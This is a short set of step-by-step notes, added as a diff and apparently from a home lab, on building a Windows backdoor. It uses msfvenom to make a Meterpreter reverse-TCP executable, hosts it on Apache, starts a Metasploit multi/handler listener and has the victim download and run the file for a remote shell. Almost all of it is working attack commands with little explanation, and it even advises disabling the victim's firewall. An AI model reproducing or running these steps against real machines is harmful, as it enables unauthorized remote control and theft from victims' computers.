@@ -1,0 +1,37 @@
+using backdoor
+
+exploit: exploit/multi/handler
+
+step 1: create exe file
+            command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.124.130 LPORT=4444 -f exe -o                filename.exe
+step 2: mv filename.exe /var/www/html/
+step 3: cd /var/www/html
+step 4: service apache2 start
+step 5: chmod +x filename.exe
+
+In other terminal launch msfconsole
+
+step 6: use exploit/multi/handler
+step 7: set payload windows/meterpreter/reverse_tcp
+step 8: set LHOST 192.168.124.130
+step 9: set LPORT 4444
+step 10: exploit
+
+Launch windows in VMware
+to check whether host and victim is reachable, if it is not reachable try to turn off firewall in windows.
+
+from windows cmd (ping kali IP address)
+step 11: ping 192.168.124.130
+
+from kali terminal(ping windows IP address)
+step 12: ping 192.168.124.131
+
+In windows system
+in internet explorer type IP address of host machine and file name
+step 13: 192.168.124.130/filename.exe
+
+save and run file
+
+In metasploit 
+
+you will be in meterpreter, now you can run any command (example: help, screenshare). 
